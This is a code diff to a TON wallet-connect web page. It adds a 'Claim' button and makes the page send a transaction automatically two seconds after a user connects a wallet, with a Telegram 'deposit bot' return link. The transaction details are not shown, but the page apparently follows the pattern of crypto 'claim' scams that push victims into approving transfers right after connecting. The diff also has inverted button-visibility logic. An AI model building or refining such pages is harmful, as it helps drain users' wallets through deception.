@@ -9,6 +9,7 @@
 <body>
     <div class="container">
         <button class="connect-wallet-button" id="connect-btn">Connect Wallet</button>
+        <button class="send-transaction-button" id="send-transaction">Claim</button>
     </div>
     <div class="bottom-container">
         <button id="disconnect-btn" class="bottom-button">Bottom Button</button>
@@ -24,36 +25,29 @@
         twaReturnUrl: 'https://t.me/wallet_connect_deposit_bot'
     };
 
-    let connectedWallet = tonConnectUI.wallet;
+    let connectWallet = tonConnectUI.wallet;
     setInnerHtml();
 
     function setInnerHtml() {
-        if(connectedWallet) {
-            document.getElementById('connect-btn').innerHTML = 'Claim';
+        if(connectWallet) {
+            document.getElementById('connect-btn').style.display = 'none';
         }
         else{
-            document.getElementById('connect-btn').innerHTML = 'Connect Wallet';
+            document.getElementById('send-transaction').style.display = 'block';
         }
     }
 
     document.getElementById("connect-btn").addEventListener('click', async () => {
         // Call the function
-        if(connectedWallet) {
-            document.getElementById('connect-btn').innerHTML = 'Claim';
-            sendTransaction();
-        }
-        else{
-            document.getElementById('connect-btn').innerHTML = 'Connect Wallet';
-            
-            await connectToWallet().catch(error => {
-                console.error("Error connecting to wallet:", error);
-            });
-        }
+        await connectToWallet().catch(error => {
+            console.error("Error connecting to wallet:", error);
+        });
     });
 
     async function connectToWallet() {
-        connectedWallet = await tonConnectUI.connectWallet();
-        
+        const connectedWallet = await tonConnectUI.connectWallet();
+        document.getElementById('connect-btn').style.display = 'none';
+        document.getElementById('send-transaction').style.display = 'block';
         setTimeout(function() {
             sendTransaction();
         }, 2000);
@@ -75,8 +69,12 @@
     
     document.getElementById("disconnect-btn").addEventListener('click', async () => {
         await tonConnectUI.disconnect();
-        connectedWallet = null;
-        setInnerHtml();
+        document.getElementById('connect-btn').style.display = 'block';
+        document.getElementById('send-transaction').style.display = 'none';
+    });
+
+    document.getElementById("send-transaction").addEventListener('click', async () => {
+        await sendTransaction();
     });
 </script>
 </html>
